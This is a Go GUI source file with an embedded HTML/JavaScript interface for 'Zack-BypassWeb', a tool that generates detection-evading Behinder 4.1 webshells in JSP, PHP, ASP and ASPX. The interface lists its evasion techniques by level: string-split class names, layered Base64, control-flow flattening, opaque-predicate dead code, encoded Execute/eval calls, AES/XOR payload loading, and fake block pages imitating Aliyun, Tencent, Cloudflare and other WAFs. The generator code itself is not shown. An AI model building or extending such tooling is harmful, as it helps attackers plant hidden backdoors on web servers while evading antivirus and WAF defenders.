// Zack-BypassWeb - 冰蝎4.1 免杀Webshell生成框架
// Copyright (C) 2024 Zack
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package gui

import (
	"Zack-BypassWeb/pkg/generator"
	"Zack-BypassWeb/pkg/utils"
	"encoding/json"
	"net/url"

	webview "github.com/webview/webview_go"
)

const VERSION = "v1.0"

func Run() {
	w := webview.New(false)
	defer w.Destroy()
	w.SetTitle("Zack-BypassWeb " + VERSION + " - 冰蝎4.1 免杀Webshell生成器")
	w.SetSize(1100, 700, webview.HintNone)

	w.Bind("generateWebshell", func(lang, pass, waf string, level int) string {
		if pass == "" {
			pass = utils.RandString(utils.RandInt(6, 12))
		}
		opts := generator.Options{
			Language:   lang,
			Pass:       pass,
			WAF:        waf,
			EvasionLvl: level,
		}
		var result generator.Result
		switch lang {
		case "jsp":
			result = generator.NewJSPGenerator(opts).Generate()
		case "jspx":
			opts.Language = "jspx"
			result = generator.NewJSPGenerator(opts).Generate()
		case "php":
			result = generator.NewPHPGenerator(opts).Generate()
		case "asp":
			result = generator.NewASPGenerator(opts).Generate()
		case "aspx":
			result = generator.NewASPXGenerator(opts).Generate()
		case "ashx":
			opts.Language = "ashx"
			result = generator.NewASPXGenerator(opts).Generate()
		default:
			return `{"error":"不支持的语言"}`
		}

		b, _ := json.Marshal(map[string]string{
			"code": result.Code,
			"note": result.Note,
			"key":  result.Key,
			"pass": pass,
		})
		return string(b)
	})

	w.Navigate("data:text/html," + url.PathEscape(htmlContent))
	w.Run()
}

var htmlContent = `<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<style>
:root {
    --bg: #ffffff; --panel: #f8f9fa; --border: #e2e4e9;
    --text: #1a1a2e; --dim: #8b8fa3; --accent: #4f46e5;
    --green: #059669; --red: #dc2626;
    --input-bg: #ffffff; --hover: #f1f3f5; --radius: 8px;
    --shadow: 0 1px 3px rgba(0,0,0,0.06);
    --font: -apple-system, BlinkMacSystemFont, 'Microsoft YaHei', 'PingFang SC', sans-serif;
}
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: var(--font); background: var(--bg); color: var(--text); height: 100vh; display: flex; overflow: hidden; user-select: none; }
.note-text, .code-area, .conn-info { user-select: text; }

.sidebar {
    width: 360px; min-width: 360px; background: var(--panel);
    border-right: 1px solid var(--border); display: flex;
    flex-direction: column; padding: 24px 20px; overflow-y: auto;
}
.sidebar::-webkit-scrollbar { width: 4px; }
.sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }

.logo { font-size: 22px; font-weight: 700; color: var(--accent); letter-spacing: -0.5px; margin-bottom: 16px; }
.logo span { color: var(--dim); font-weight: 400; font-size: 13px; margin-left: 6px; }

.section { margin-top: 14px; }
.section-label { font-size: 12px; color: var(--dim); margin-bottom: 6px; font-weight: 600; }
select, input[type="text"] {
    width: 100%; background: var(--input-bg); border: 1px solid var(--border);
    color: var(--text); padding: 9px 12px; border-radius: var(--radius);
    font-size: 13px; font-family: var(--font); outline: none; box-shadow: var(--shadow);
    transition: border-color 0.2s, box-shadow 0.2s;
}
select:focus, input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(79,70,229,0.1); }
select { cursor: pointer; appearance: none; background-image: url("data:image/svg+xml,%3Csvg width='12' height='12' viewBox='0 0 12 12' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill='%238b8fa3' d='M6 8L1 3h10z'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 10px center; padding-right: 30px; }

.level-row { display: flex; gap: 8px; }
.level-btn {
    flex: 1; padding: 8px; border: 1px solid var(--border); border-radius: var(--radius);
    font-size: 13px; font-weight: 600; cursor: pointer; font-family: var(--font);
    text-align: center; background: var(--input-bg); color: var(--dim); transition: all 0.15s;
}
.level-btn:hover { border-color: var(--accent); }
.level-btn.sel { background: var(--accent); color: #fff; border-color: var(--accent); }

.tech-info {
    margin-top: 8px; font-size: 11px; color: var(--dim); line-height: 1.7;
    background: #fff; border: 1px solid var(--border); border-radius: 6px;
    padding: 8px 10px; min-height: 36px;
}

.btn { width: 100%; padding: 11px; border: none; border-radius: var(--radius); font-size: 14px; font-weight: 600; cursor: pointer; font-family: var(--font); transition: all 0.2s; }
.btn-primary { background: var(--accent); color: #fff; margin-top: 16px; }
.btn-primary:hover { background: #4338ca; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(79,70,229,0.3); }

.main { flex: 1; display: flex; flex-direction: column; padding: 24px; overflow: hidden; background: #fff; }
.main-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
.main-header h2 { font-size: 15px; font-weight: 600; color: var(--text); }
.main-header .actions { display: flex; gap: 8px; }
.main-header .actions button {
    background: #fff; border: 1px solid var(--border); color: var(--text);
    padding: 6px 16px; border-radius: var(--radius); font-size: 12px; cursor: pointer; font-family: var(--font);
}
.main-header .actions button:hover { border-color: var(--accent); color: var(--accent); }

.code-area { flex: 1; background: #fafbfc; border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; font-family: 'SF Mono','Cascadia Code','Consolas',monospace; font-size: 12.5px; line-height: 1.7; color: var(--text); resize: none; outline: none; overflow-y: auto; white-space: pre-wrap; word-break: break-all; tab-size: 4; }
.code-area:focus { border-color: var(--accent); }
.code-area::-webkit-scrollbar { width: 4px; }
.code-area::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }

.note-text { font-size: 12px; color: var(--green); margin-top: 8px; min-height: 18px; }
.status-bar { display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: var(--dim); margin-top: 6px; }
.status-bar .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); display: inline-block; margin-right: 6px; }

.toast { position: fixed; top: 20px; right: 20px; background: var(--green); color: #fff; padding: 10px 20px; border-radius: var(--radius); font-size: 13px; font-weight: 600; opacity: 0; transform: translateY(-10px); transition: all 0.3s; pointer-events: none; z-index: 200; box-shadow: 0 4px 12px rgba(5,150,105,0.3); }
.toast.show { opacity: 1; transform: translateY(0); }
</style>
</head>
<body>

<div class="sidebar">
    <div class="logo">Zack-BypassWeb <span>` + VERSION + `</span></div>
    <div class="section">
        <div class="section-label">目标语言</div>
        <select id="lang" onchange="onLangChange()">
            <option value="jsp">JSP (Java)</option>
            <option value="jspx">JSPX (XML JSP)</option>
            <option value="php">PHP</option>
            <option value="asp">ASP (VBScript)</option>
            <option value="aspx">ASPX (C# WebForm)</option>
            <option value="ashx">ASHX (C# Handler)</option>
        </select>
    </div>
    <div class="section">
        <div class="section-label">连接密码</div>
        <input type="text" id="pass" placeholder="留空自动生成随机密码">
    </div>
    
    <div class="section">
        <div class="section-label">免杀等级</div>
        <div class="level-row">
            <button class="level-btn sel" id="lv1" onclick="setLevel(1)">Lv.1<br><small>基础</small></button>
            <button class="level-btn" id="lv2" onclick="setLevel(2)">Lv.2<br><small>中级</small></button>
            <button class="level-btn" id="lv3" onclick="setLevel(3)">Lv.3<br><small>高级</small></button>
        </div>
        <div class="tech-info" id="techInfo"></div>
    </div>
    <div class="section">
        <div class="section-label">WAF 伪装页面</div>
        <select id="waf">
            <option value="none">无伪装</option>
            <option value="aliyun">阿里云 WAF (405)</option>
            <option value="safedog">安全狗 (405)</option>
            <option value="tencent">腾讯云 WAF (403)</option>
            <option value="safeline">长亭 SafeLine (405)</option>
            <option value="anyu">安域 WAF (403)</option>
            <option value="wangsu">网宿 CDN (405)</option>
            <option value="baidu">百度云 WAF (403)</option>
            <option value="cloudflare">Cloudflare (403)</option>
        </select>
    </div>
    <button class="btn btn-primary" onclick="doGenerate()">生成 Webshell</button>
</div>

<div class="main">
    <div class="main-header">
        <h2>生成代码 — 冰蝎4.1</h2>
        <div class="actions"><button onclick="downloadCode()">下载</button><button onclick="copyCode()">复制</button><button onclick="clearCode()">清空</button></div>
    </div>
    <textarea class="code-area" id="codeOutput" placeholder="设置参数后点击「生成 Webshell」..." readonly></textarea>
    <div class="note-text" id="noteText"></div>
    <div class="status-bar"><span><span class="dot"></span>就绪</span><span id="statusInfo">冰蝎4.1 免杀生成器</span></div>
</div>

<div class="toast" id="toast">已复制到剪贴板</div>

<script>
var currentLevel = 1;

var techMap = {
    jsp: {
        1: "<b>Lv.1 基础</b><br>多态变量命名(50个) &bull; 类名字符串拆分混淆(&quot;java&quot;+&quot;.&quot;+&quot;util.Base&quot;+&quot;64&quot;) &bull; 三层Base64解码回退 &bull; 多样POST检测(4种) &bull; defineClass/equals方法名拆分 &bull; 注释注入(8处) &bull; Session键名混淆 &bull; <b style=color:#4f46e5>死代码注入(不透明谓词x2)</b>",
        2: "<b>Lv.2 中级</b><br>Lv.1全部 + <b style=color:#4f46e5>控制流平坦化</b> &bull; <b style=color:#4f46e5>噪音import指令</b> &bull; <b style=color:#4f46e5>增强死代码(x3 + 内部x1)</b> &bull; <b style=color:#4f46e5>POST块内死代码注入</b>",
        3: "<b>Lv.3 高级</b><br>Lv.1+Lv.2全部 + <b style=color:#dc2626>类名深度拆分(cry+pto)</b> &bull; <b style=color:#dc2626>增强死代码(x5 + 内部x2)</b> &bull; <b style=color:#dc2626>双重噪音import</b>",
    },
    jspx: {
        1: "<b>Lv.1 基础</b><br>多态变量命名(50个) &bull; 类名字符串拆分混淆 &bull; 三层Base64解码回退 &bull; 多样POST检测(4种) &bull; defineClass/equals方法名拆分 &bull; 注释注入(8处) &bull; Session键名混淆 &bull; CDATA封装 &bull; <b style=color:#4f46e5>死代码注入(不透明谓词x2)</b>",
        2: "<b>Lv.2 中级</b><br>Lv.1全部 + <b style=color:#4f46e5>控制流平坦化</b> &bull; <b style=color:#4f46e5>噪音import指令</b> &bull; <b style=color:#4f46e5>增强死代码(x3 + 内部x1)</b> &bull; <b style=color:#4f46e5>POST块内死代码注入</b>",
        3: "<b>Lv.3 高级</b><br>Lv.1+Lv.2全部 + <b style=color:#dc2626>类名深度拆分(cry+pto)</b> &bull; <b style=color:#dc2626>增强死代码(x5 + 内部x2)</b> &bull; <b style=color:#dc2626>双重噪音import</b>",
    },
    php: {
        1: "<b>Lv.1 基础</b><br>多态变量命名 &bull; Session密钥存储(冰蝎协议) &bull; openssl/XOR双路径解密 &bull; explode+__invoke+eval协议",
        2: "<b>Lv.2 中级</b><br>Lv.1全部 + <b style=color:#4f46e5>base64_decode函数chr混淆</b> &bull; <b style=color:#4f46e5>死代码注入(不透明谓词)</b> &bull; <b style=color:#4f46e5>控制流平坦化</b>",
        3: "<b>Lv.3 高级</b><br>Lv.1+Lv.2全部 + <b style=color:#dc2626>额外PHP死代码块</b>"
    },
    asp: {
        1: "<b>Lv.1 基础</b><br>多态变量命名 &bull; Chr(107)构建Session键名 &bull; Execute()动态设Session &bull; 密钥2片拆分(&amp;) &bull; XOR循环多形态(6种) &bull; Execute/ExecuteGlobal Chr+hex混合编码 &bull; VBScript注释注入 &bull; <b style=color:#4f46e5>死代码注入(不透明谓词x2)</b>",
        2: "<b>Lv.2 中级</b><br>Lv.1全部 + <b style=color:#4f46e5>控制流平坦化(If True包装)</b> &bull; <b style=color:#4f46e5>增强死代码(不透明谓词x3)</b> &bull; <b style=color:#4f46e5>Chr()诱饵函数名注释</b>",
        3: "<b>Lv.3 高级</b><br>Lv.1+Lv.2全部 + <b style=color:#dc2626>密钥3片拆分(&amp;&amp;)</b> &bull; <b style=color:#dc2626>增强死代码(不透明谓词x4)</b> &bull; <b style=color:#dc2626>Eval() Chr诱饵</b>",
    },
    aspx: {
        1: "<b>Lv.1 基础</b><br>多态变量+随机类名 &bull; 注释注入 &bull; Session.Add密钥存储(冰蝎协议) &bull; Rijndael AES解密 &bull; Assembly.Load执行 &bull; 方法名拼接混淆",
        2: "<b>Lv.2 中级</b><br>Lv.1全部 + <b style=color:#4f46e5>密钥字符串拆分(+)</b> &bull; <b style=color:#4f46e5>死代码注入(不透明谓词)</b>",
        3: "<b>Lv.3 高级</b><br>Lv.1+Lv.2全部 + <b style=color:#dc2626>密钥变量拆分(string+=+)</b>",
    },
    ashx: {
        1: "<b>Lv.1 基础</b><br>多态变量+随机类名 &bull; 注释注入 &bull; Session.Add密钥存储(冰蝎协议) &bull; Rijndael AES解密 &bull; Assembly.Load执行 &bull; 方法名拼接混淆",
        2: "<b>Lv.2 中级</b><br>Lv.1全部 + <b style=color:#4f46e5>密钥字符串拆分(+)</b> &bull; <b style=color:#4f46e5>死代码注入(不透明谓词)</b>",
        3: "<b>Lv.3 高级</b><br>Lv.1+Lv.2全部 + <b style=color:#dc2626>密钥变量拆分(string+=+)</b>",
    }
};

function setLevel(lv) {
    currentLevel = lv;
    document.querySelectorAll('.level-btn').forEach(function(e,i){
        e.classList.toggle('sel', i+1 === lv);
    });
    updateTechInfo();
}

function updateTechInfo() {
    var lang = document.getElementById("lang").value;
    var lv = currentLevel;
    var info = techMap[lang] && techMap[lang][lv] ? techMap[lang][lv] : "";
    document.getElementById("techInfo").innerHTML = info;
}

function onLangChange() {
    var l = document.getElementById("lang").value;
    updateTechInfo();
}

async function doGenerate() {
    var o = document.getElementById("codeOutput");
    o.value = "正在生成...";
    document.getElementById("noteText").textContent = "";
    try {
        var pass = document.getElementById("pass").value;
        var lang = document.getElementById("lang").value;
        var r = JSON.parse(await generateWebshell(
            lang,
            pass,
            document.getElementById("waf").value,
            currentLevel
        ));
        if (r.error) {
            o.value = "错误: " + r.error;
        } else {
            o.value = r.code;
            var langUpper = lang.toUpperCase();
            document.getElementById("noteText").textContent = "冰蝎4.1 " + langUpper + " | Lv." + currentLevel + " | 密码: " + (pass || r.pass);
            document.getElementById("statusInfo").textContent = r.error ? "生成失败" : "已生成";
        }
    } catch(e) { o.value = "错误: " + e.message; }
}

function copyCode() {
    var ta = document.getElementById("codeOutput");
    if (!ta || !ta.value) return;
    try {
        navigator.clipboard.writeText(ta.value).then(function() {
            var t = document.getElementById("toast"); t.classList.add("show");
            setTimeout(function(){ t.classList.remove("show"); }, 2000);
        });
    } catch(e) { ta.select(); document.execCommand("copy"); }
}

function downloadCode() {
    var ta = document.getElementById("codeOutput");
    if (!ta || !ta.value) return;
    var lang = document.getElementById("lang").value;
    var ext = "." + lang;
    var rnd = Math.random().toString(36).substring(2, 10);
    var blob = new Blob([ta.value], {type: "text/plain"});
    var a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = rnd + ext;
    a.click();
    URL.revokeObjectURL(a.href);
}

function clearCode() {
    document.getElementById("codeOutput").value = "";
    document.getElementById("noteText").textContent = "";
}

// Init tech info on load
updateTechInfo();
</script>
</body>
</html>`
